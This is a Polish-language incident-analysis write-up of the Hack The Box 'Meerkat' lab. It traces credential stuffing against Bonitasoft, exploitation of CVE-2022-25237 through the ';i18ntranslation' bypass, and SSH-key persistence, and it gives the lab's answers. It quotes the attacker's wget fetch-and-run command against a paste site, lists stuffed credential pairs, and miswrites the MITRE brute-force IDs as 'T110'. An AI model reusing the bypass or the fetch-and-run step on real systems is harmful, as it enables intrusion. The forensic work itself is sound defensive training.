+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_root_answ.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_root_answ.png">
+
+  
+</figure>
+</p>
+<p>Następnie wykonał zapytanie DELETE, najprawdopodobniej aby usunąć rozszerzenie.</p>
+<p><strong>Odpowiedź: Bonitasoft</strong></p>
+
+<h2 class="relative group">Pytanie 2 
+    <div id="pytanie-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-2" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?</strong></p>
+<p>Przed uploadem złośliwego rozszerzenia widzimy, że TA próbował wielokrotnie zalogować się do aplikacji webowej - serwer odpowiadał kodem 401 (Unauthorized). Poniżej fragment logów w PCAP i zapytań POST do http://forela[.]co.uk:8080/bonita/loginservice .</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_login_brute_force"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_brute_force_hu_fd65846d2e9d75f.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_brute_force_hu_a2c4f4759e787ee6.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_brute_force_hu_f2a605003c17c7bc.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_brute_force.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_brute_force.png">
+
+  
+</figure>
+</p>
+<p>Atakujący próbował wielu kombinacji username&rsquo;a i hasła m.in.</p>
+<ul>
+<li>install:install</li>
+<li>Cyndy.Element@forela[.]co.uk:ybWxct</li>
+<li>Berny.Ferrarin@foreala[.]co.uk:lPCO6Z</li>
+<li>Jenilee.Pressma@forela[.]co.uk:3eYwLOKhQEcl</li>
+</ul>
+<p>Przypominam, że aby eksploit zadziałał, atakujący musi mieć ważną sesję użytkownika - nie musi on mieć jednak specjalnych uprawnień. Stąd ten brute force. Po wielokrotnych próbach TA zalogował się na konto użytkownika <code>seb.broom@forela[.]co.uk</code> za pomocą hasła <code>g0vernm3nt</code>. Zaraz po tym podrzucił złośliwe rozszerzenie.</p>
+<p>Na podstawie tych logów wnioskujemy, że mamy do czynienia z sub-techniką T110.004 (MITRE ATT&amp;CK) należącej do kategorii Brute-Force - Credential Stuffing. Jest to technika polegająca na wykorzystywaniu danych uwierzytelniających, które zostały wcześniej wykradzione lub opublikowane po wycieku danych np. innej firmy. Atakujący wykorzystują fakt, że ludzie korzystają z tych samych credentiali do logowania się do różnych serwisów. Tak więc nie jest to metoda &ldquo;Password Guessing (T110.001)&rdquo;, ponieważ wtedy mielibyśmy najpewniej do czynienia z listą najczęściej wykorzystywanych credentiali (admin, password, dupa123 itd.)</p>
+<p>Poniżej screen z zapytania POST z próbą zalogowania - serwer odpowiada kodem 204 (sukces).</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_login_successful"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_successful_hu_fb07404cd5e7588c.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_successful_hu_7ce6aeaf3b61769f.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_successful_hu_14a3502805b80925.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_successful.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_login_successful.png">
+
+  
+</figure>
+</p>
+<p><strong>Odpowiedź: Credential Stuffing</strong></p>
+
+<h2 class="relative group">Pytanie 3 
+    <div id="pytanie-3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-3" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Does the vulnerability exploited have a CVE assigned - and if so, which one?</strong></p>
+<p>Na to pytanie już sobie odpowiedzieliśmy. Jest to CVE-2022-25237.</p>
+<p><strong>Odpowiedź: CVE-2022-25237</strong></p>
+
+<h2 class="relative group">Pytanie 4 
+    <div id="pytanie-4" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-4" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Which string was appended to the API URL path to bypass the authorization filter by the attacker&rsquo;s exploit?</strong></p>
+<p>Według opisu CVE oraz logów w PCAP chodzi o string <code>;i18ntranslation</code>. Na podstawie opisu w https://rhinosecuritylabs[.]com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/ widzimy, że filtr pozwala na ominięcie uwierzytelniania jeśli w URL znajduje się string <code>/i18ntranslation/../</code> lub <code>;i18ntranslation</code>.</p>
+<p><strong>Odpowiedź: ;i18ntranslation</strong></p>
+
+<h2 class="relative group">Pytanie 5 
+    <div id="pytanie-5" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-5" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>How many combinations of usernames and passswords were used in the credential stuffing attack?</strong></p>
+<p>W pytaniu najpewniej chodzi o unikalne kombinacje username&rsquo;a i hasła. Analizując logi można zobaczyć powtarzającą się kombinację install:install. Odfiltrujmy je za pomocą odpowiedniego filtra w Wireshark
+<code>http.request.method== &quot;POST&quot; &amp;&amp; http.request.uri contains &quot;/bonita/loginservice&quot; &amp;&amp; not http contains &quot;install&quot;</code></p>
+<ul>
+<li>Szukamy zapytań POST</li>
+<li>Szukamy zapytań do endopontu /bonita/loginservice</li>
+<li>Message body nie zawiera słowa &ldquo;install&rdquo;</li>
+</ul>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_wireshark_filter"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_wireshark_filter_hu_567db7da4116c888.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_wireshark_filter_hu_f3d81c116c53ff44.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_wireshark_filter_hu_19a39637832ea73c.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_wireshark_filter.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_wireshark_filter.png">
+
+  
+</figure>
+</p>
+<p>Mamy już tylko 59 wyników - odejmujemy 3 powtórzone kombinacje `seb.broom@forela[.]co.uk:g0vernm3nt.</p>
+<p><strong>Odpowiedź: 56</strong></p>
+
+<h2 class="relative group">Pytanie 6 
+    <div id="pytanie-6" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-6" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Which username and password combination was successful?</strong></p>
+<p>Już poznaliśmy odpowiedź w pytaniu 2.</p>
+<p><strong>Odpowiedź: `seb.broom@forela[.]co.uk:g0vernm3nt&rsquo;</strong></p>
+
+<h2 class="relative group">Pytanie 7 
+    <div id="pytanie-7" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-7" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>If any, which text sharing site did the attacker utilise?</strong></p>
+<p>Atakujący wykonał zdalne polecenie <code>wget</code> do strony https://pastes[.]io/raw/bx5gcr0et8</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_pastes_io"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_io_hu_5a9496454dd3db54.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_io_hu_d0f31c72e80e7a3.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_io_hu_ca16e89f267d4f7.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_io.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_io.png">
+
+  
+</figure>
+</p>
+<p><strong>Odpowiedź: pastes.io</strong></p>
+
+<h2 class="relative group">Pytanie 8 
+    <div id="pytanie-8" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-8" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Please provide the filename of the public key used by the attacker to gain persistence on our host.</strong></p>
+<p>Pastes[.]io to usługa internetowa, która umożliwia przechowywanie i dzielenie się tekstem w formie <strong>pastebin</strong>, czyli prostych notatek tekstowych.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_pasteio"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pasteio_hu_569efa190f439a51.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pasteio_hu_a88a11a0aa19b3c6.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pasteio_hu_b485f806ade7fea9.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pasteio.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pasteio.png">
+
+  
+</figure>
+</p>
+<p>Przeanalizujmy adres strony, do której chciał się dostać atakujący. Może Virus Total coś pokaże.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_vt"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vt_hu_fda5b4b7649b89eb.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vt_hu_4c378ddfbc3a12e4.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vt_hu_887703b73ca0c715.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vt.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vt.png">
+
+  
+</figure>
+</p>
+<p>Wygląda na to, że domena jest wykorzystywana przez malware typu RAT - Remote Access Trojan. W skrócie to złośliwe oprogramowanie podszywające się pod takie normalne, które jest wykorzystywane do uzyskania zdalnego dostępu. Z informacji wynika, że ASYNCRAT i DCRAT korzystają z domeny. Virus Total oznaczył to m.in. jako phishing. Przeszukajmy internet po więcej informacji.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_google"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_google_hu_2f949afa8da6823d.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_google_hu_1939a6c088ac615.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_google_hu_35c071d68c0b7cb4.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_google.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_google.png">
+
+  
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_anyrun"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_anyrun_hu_5a1218f0cf65f592.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_anyrun_hu_37d43ec576e83a24.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_anyrun_hu_9b947d34bd806788.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_anyrun.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_anyrun.png">
+
+  
+</figure>
+</p>
+<p>Na jednym ze screenów w AnyRun widać, że strona jest wykorzystywana m.in. do udostępniania złośliwego kodu. Atakujący pobrał go i uruchomił na maszynie serwera.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_pastes_code"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_code_hu_d9f1b9fd5a7a818f.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_code_hu_943b12f24fc141fc.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_code_hu_3fe40ed7af722bfc.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_code.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_pastes_code.png">
+
+  
+</figure>
+</p>
+<p>Atakujący pobiera zawartość za pomocą polecenia curl i zapisuje do pliku <code>authorized_keys</code>, który w Linuxie trzyma klucze publiczne używane do uwierzytelnienia podczas próby uzyskania zdalnego dostępu SSH. W ten sposób atakujący przechodzi do następnego etapu - utrzymanie stałej metody dostępu do serwera (persistence).</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_key"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_key_hu_ab26792497b07d69.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_key_hu_f42eb95b60cfb65c.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_key_hu_76ed76737f957e47.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_key.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_key.png">
+
+  
+</figure>
+</p>
+<p>Powyżej widzimy klucz.</p>
+<p><strong>Odpowiedź: hffgra4unv</strong></p>
+
+<h2 class="relative group">Pytanie 9 
+    <div id="pytanie-9" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-9" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Can you confirm the file modified by the attacker to gain persistence?</strong></p>
+<p>Chodzi tu o plik <code>authorized_keys</code>, w którym przetrzymywane są publiczne klucze SSH, aby zalogować się na usera bez podawania hasła.</p>
+<p><strong>Odpowiedź:  /home/ubuntu/.ssh/authorized_keys</strong></p>
+
+<h2 class="relative group">Pytanie 10 
+    <div id="pytanie-10" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-10" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Can you confirm the MITRE technique ID of this type of persistence mechanism?</strong></p>
+<p>Ostatnie pytanie dotyczy ID użytej metody z MITRE ATT&amp;CK.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_mitre"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_mitre_hu_cfbdaf7969df4028.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_mitre_hu_d89a9ed1d032bf70.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_mitre_hu_e2c3f252b1705fe1.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_mitre.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_mitre.png">
+
+  
+</figure>
+</p>
+<p><strong>Odpowiedź: T1098.004</strong></p>
+<p>Na koniec stwórzmy timeline, aby podsumować działania TA.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">Data i godzina</th>
+          <th>Opis</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">19/01/2023 15:31:12 UTC</td>
+          <td>Atakujący (156.146.62.213) uzyskuje dostęp do strony głównej Bonita</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">19/01/2023 15:31:27 UTC</td>
+          <td>Pierwsza, nieudana próba logowania</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">19/01/2023 15:35:04 UTC</td>
+          <td>Pierwsze udane logowanie przez TA - użyta kombinacja username:password <code>seb.broom@forela[.]co.uk:g0vernm3nt</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">19/01/2023 15:35:04 UTC</td>
+          <td>Skuteczne użycie eksploita przez TA - podatność CVE-2022-25237. Upload złośliwego rozszerzenia <code>rce_extension_api.zip</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">19/01/2023 15:35:05 UTC</td>
+          <td>Zdalne wykonanie polecenia <code>whoami</code> na serwerze ofiary. Opdowiedź - root</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">19/01/2023 15:38:38 UTC</td>
+          <td>TA wykonuje zdalne polecenie <code>wget https://pastes[.]io/raw/bx5gcr0et8</code> na serwerze ofiary. Kod zawarty na stronie jest wykonywany i utworzony zostaje nowy klucz publiczny SSH  w pliku <code>authorized_keys</code>. Persystencja zdalnego dostępu do serwera przez TA.</td>
+      </tr>
+  </tbody>
+</table>
+
+          
+          
+          
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/CyberZgroza/js/page.min.407e5b2727c1f241c95d53db24c776bea71bfc18e09511b815d669ad8caca6e9e18a53864ad364b1ccccfa2f2956768d33cfe193bfb64d3406f3b5ece354ba57.js"
+          integrity="sha512-QH5bJyfB8kHJXVPbJMd2vqcb/BjglRG4FdZprYyspunhilOGStNksczM&#43;i8pVnaNM8/hk7&#43;2TTQG87Xs41S6Vw=="
+          data-oid="views_posts\HTB_sherlock_meerkat\index.md"
+          data-oid-likes="likes_posts\HTB_sherlock_meerkat\index.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/CyberZgroza/posts/htb_sherlock_phishnet/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Hack The Box Sherlock - PhishNet</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-09-11T00:00:00&#43;00:00">11 September 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          CyberZgroza
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/CyberZgroza/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-index-500"
+  data-url="http://localhost:1313/CyberZgroza/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
